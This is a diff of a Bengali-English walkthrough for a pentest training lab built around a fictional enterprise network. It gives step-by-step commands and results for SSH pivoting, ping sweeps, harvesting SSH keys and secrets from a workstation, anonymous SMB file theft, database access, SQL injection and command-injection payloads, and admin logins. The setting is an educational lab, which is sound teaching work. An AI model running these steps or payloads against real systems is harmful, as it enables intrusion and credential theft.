@@ -438,10 +438,15 @@ http://<VPS_IP>:9001 → Login required
 
 ### 🔍 Internal Network Discovery
 
+📍 **কোথায় run করবো:** নিজের machine (local terminal) থেকে
+
+**COMMAND:**
 ```bash
 ssh devops-remote@<VPS_IP> -p 2222
+# Password: devops-remote@123
 ```
 
+**RESULT (bastion এ login হলে banner দেখাবে):**
 ```
 ╔══════════════════════════════════════════════════════════╗
 ║   NEXUS GLOBAL ENTERPRISE — SSH BASTION HOST (DMZ)      ║
@@ -452,13 +457,25 @@ ssh devops-remote@<VPS_IP> -p 2222
 ╚══════════════════════════════════════════════════════════╝
 ```
 
+📍 **কোথায় run করবো:** Bastion shell এ (`bastion:~$`)
+
+**COMMAND:**
 ```bash
 ip route
-# 10.0.2.0/24 dev eth1  ← Core
-# 10.0.3.0/24 dev eth2  ← Data Center
-# 10.0.4.0/24 dev eth0  ← Campus
 ```
 
+**RESULT:**
+```
+default via 10.0.4.254 dev eth0
+10.0.1.0/24 dev eth3  src 10.0.1.40   ← DMZ (আমরা এখানে)
+10.0.2.0/24 dev eth1  src 10.0.2.5    ← Core
+10.0.3.0/24 dev eth2  src 10.0.3.5    ← Data Center
+10.0.4.0/24 dev eth0  src 10.0.4.5    ← Campus
+```
+
+📍 **কোথায় run করবো:** Bastion shell এ (`bastion:~$`)
+
+**COMMAND:**
 ```bash
 for i in $(seq 1 254); do
   (ping -c1 -W1 10.0.2.$i &>/dev/null && echo "10.0.2.$i UP") &
@@ -469,25 +486,63 @@ for i in $(seq 1 254); do
 done; wait
 ```
 
+**RESULT (UP হওয়া hosts):**
 ```
-10.0.2.10  → AD Domain Controller
-10.0.2.21  → Grafana
-10.0.2.99  → SIEM/SOC
-10.0.3.10  → Internal ERP
-10.0.3.20  → Production PostgreSQL  ← TARGET
-10.0.3.30  → MinIO Backup
+10.0.2.10  UP  → AD Domain Controller   (internal_network_map.txt থেকে জানি)
+10.0.2.21  UP  → Grafana                (internal_network_map.txt থেকে জানি)
+10.0.2.99  UP  → SIEM/SOC              (internal_network_map.txt থেকে জানি)
+10.0.3.10  UP  → Internal ERP
+10.0.3.20  UP  → Production PostgreSQL  ← TARGET
+10.0.3.30  UP  → MinIO Backup
 ```
+
+> 💡 **"এই IP → Service mapping কোথা থেকে পেলাম?"**
+> Ping sweep শুধু বলে কোন IP **alive** — নাম বা service বলে না।
+> এই mapping দুটো source থেকে:
+> 1. **FTP anonymous login** এ যে `internal_network_map.txt` পেয়েছিলাম — ওখানে সব IP + hostname লেখা ছিল
+> 2. **Gray-box info** — client দেওয়া network document
+>
+> *"Ping sweep + FTP map = পুরো internal picture। এটাই reconnaissance chain।"*
 
 ---
 
 ### 💎 Exclusive #1 — Workstation Credential Harvest
 
+> 💡 **"`nexus-pc-dev-01` container name কোথা থেকে পেলাম?"**
+>
+> **Option A — VPS host থেকে** (instructor এর VPS SSH access আছে):
+> ```bash
+> docker ps --format "table {{.Names}}\t{{.Status}}"
+> # nexus-pc-dev-01   Up 2 hours
+> ```
+>
+> **Option B — Gray-box info হিসেবে দেওয়া থাকলে:**
+> Client scope document এ workstation name দেওয়া থাকে — real pentest এ এভাবেই পাওয়া যায়।
+> এই lab এ `internal_network_map.txt` তে `dev-workstation-01 (tahmed)` → container name: `nexus-pc-dev-01`।
+>
+> *"Gray-box মানে শুধু credentials না — network map, hostnames সবই client দেয়।"*
+
+📍 **কোথায় run করবো:** VPS host এ (bastion থেকে `exit` করে, তারপর VPS এ সরাসরি)
+
+**COMMAND:**
 ```bash
 docker exec -it nexus-pc-dev-01 bash
+```
 
+📍 **কোথায় run করবো:** `nexus-pc-dev-01` container shell এ
+
+**COMMAND:**
+```bash
 cat ~/.bash_history
-# psql -h 10.0.3.20 -U nexus_admin ...  ← DB password!
+```
 
+**RESULT:**
+```
+psql -h 10.0.3.20 -U nexus_admin -d nexus_prod   ← DB password history!
+```
+
+**COMMAND:**
+```bash
 cat ~/.ssh/id_rsa
 env | grep -iE "pass|secret|key|token"
 cat ~/.pgpass 2>/dev/null
@@ -502,15 +557,20 @@ cat ~/.pgpass 2>/dev/null
 
 ### 💎 Exclusive #2 — SMB Share Credential Leak
 
+📍 **কোথায় run করবো:** Bastion shell এ (`bastion:~$`)
+
+**COMMAND:**
 ```bash
 smbclient -L //10.0.2.10 -N
 ```
 
+**RESULT:**
 ```
 IT-Backups  Disk  IT Engineering Backup (RESTRICTED)
 HR-Public   Disk  HR Shared Policies
 ```
 
+**COMMAND:**
 ```bash
 smbclient //10.0.2.10/IT-Backups -N
 smb: \> get sync_prod_db.sh
@@ -519,6 +579,7 @@ smb: \> exit
 cat sync_prod_db.sh
 ```
 
+**RESULT:**
 ```bash
 DB_PASS="Nexu$Prod2026!Sec"                     # ← Production DB!
 SAN_PASS="SuperS3cUr3_B4ckup_Vault_Pass_2026!"  # ← MinIO!
@@ -535,25 +596,34 @@ SAN_PASS="SuperS3cUr3_B4ckup_Vault_Pass_2026!"  # ← MinIO!
 
 ### 💎 Exclusive #3 — Production Database (Crown Jewels)
 
+📍 **কোথায় run করবো:** Bastion shell এ (`bastion:~$`) — SMB থেকে পাওয়া password দিয়ে
+
+**COMMAND:**
 ```bash
 PGPASSWORD='Nexu$Prod2026!Sec' psql -h 10.0.3.20 -U nexus_admin -d nexus_prod
 ```
 
+📍 **কোথায় run করবো:** PostgreSQL shell এ (`nexus_prod=#`)
+
+**COMMAND:**
 ```sql
 SELECT * FROM system_vault_keys;
 ```
 
+**RESULT:**
 ```
 AWS_TRANSIT_GATEWAY_KEY  → AKIA-NEXUS-PROD-9812448109-SECKEY-ALPHA
 SWIFT_CLEARING_API_TOKEN → jwt_live_nexus_swift_bank_tx_881920194012948102
 CTF_FLAG_DATABASE_ROOT   → FLAG{CR0WN_J3W3LS_DC_D4T4B4S3_C0MPR0M1S3D_2026!}
 ```
 
+**COMMAND:**
 ```sql
 SELECT * FROM employees LIMIT 5;
 SELECT * FROM payroll LIMIT 3;
 ```
 
+**RESULT (impact বোঝানোর জন্য):**
 ```
 💳 SWIFT Token → wire fraud possible
 ☁️  AWS Key    → cloud infrastructure takeover
@@ -569,24 +639,35 @@ SELECT * FROM payroll LIMIT 3;
 
 ### 💎 Exclusive #4 — Web Portal: SQLi + Command Injection
 
+📍 **কোথায় run করবো:** Browser থেকে (attacker machine)
+
 **Login:** `http://<VPS_IP>/login` → `admin / NexusTechAdmin2026!`
 
 **Part A — SQL Injection:**
+
+**INPUT (Tracking ID field এ দাও):**
 ```
 ' UNION SELECT username,password,role,full_name,1,1 FROM portal_users--
 ```
+
+**RESULT:**
 ```
 → FLAG{SQL_1NJ3CT10N_DMZ_W3B_PORTAL_2026}
 ```
 
 **Part B — Command Injection (Ping Tool):**
+
+**INPUT (Ping tool field এ দাও):**
 ```
-8.8.8.8; id        → uid=0(root) gid=0(root)
+8.8.8.8; id
 8.8.8.8; hostname && ip addr | grep inet
 8.8.8.8; cat /etc/passwd | head -5
 ```
 
-> *"uid=0(root) — web server ROOT হিসেবে চলছে।"*
+**RESULT:**
+```
+uid=0(root) gid=0(root)   ← web server ROOT হিসেবে চলছে!
+```
 
 **MITRE:** `T1190` `T1059.004` `T1068`
 
@@ -597,19 +678,30 @@ SELECT * FROM payroll LIMIT 3;
 
 ### 💎 Exclusive #5 — Grafana
 
+📍 **কোথায় run করবো:** Bastion shell এ (`bastion:~$`)
+
+**COMMAND:**
 ```bash
 curl -s http://10.0.2.21:3000/api/org
-# {"id":1,"name":"Main Org."} → Anonymous access!
-
 curl -s http://10.0.2.21:3000/api/health
-# {"version":"13.2.0",...}
 ```
 
+**RESULT:**
+```
+{"id":1,"name":"Main Org."}   ← Anonymous access!
+{"version":"13.2.0",...}
+```
+
+📍 **কোথায় run করবো:** Browser থেকে (attacker machine)
+
+**LOGIN:**
 ```
 http://<VPS_IP>:3000
-→ nexus_nms_admin / NMS@Nexus2026! → Admin
-→ Version 13.2.0 → CVE check
+Username: nexus_nms_admin
+Password: NMS@Nexus2026!
 ```
+
+**RESULT:** Admin dashboard access ✅, Version 13.2.0 → CVE check করো
 
 **MITRE:** `T1078.001` `T1518`
 
@@ -620,11 +712,16 @@ http://<VPS_IP>:3000
 
 ### 💎 Exclusive #6 — MinIO Backup Storage
 
+📍 **কোথায় run করবো:** Browser থেকে (attacker machine)
+
+**LOGIN:**
 ```
 http://<VPS_IP>:9001
-→ nexus_san_root / SuperS3cUr3_B4ckup_Vault_Pass_2026!
-→ Full Admin → Nightly backup = full DB dump here
+Username: nexus_san_root
+Password: SuperS3cUr3_B4ckup_Vault_Pass_2026!
 ```
+
+**RESULT:** Full Admin access ✅ → Nightly backup = full DB dump এখানে আছে
 
 **MITRE:** `T1530`
 
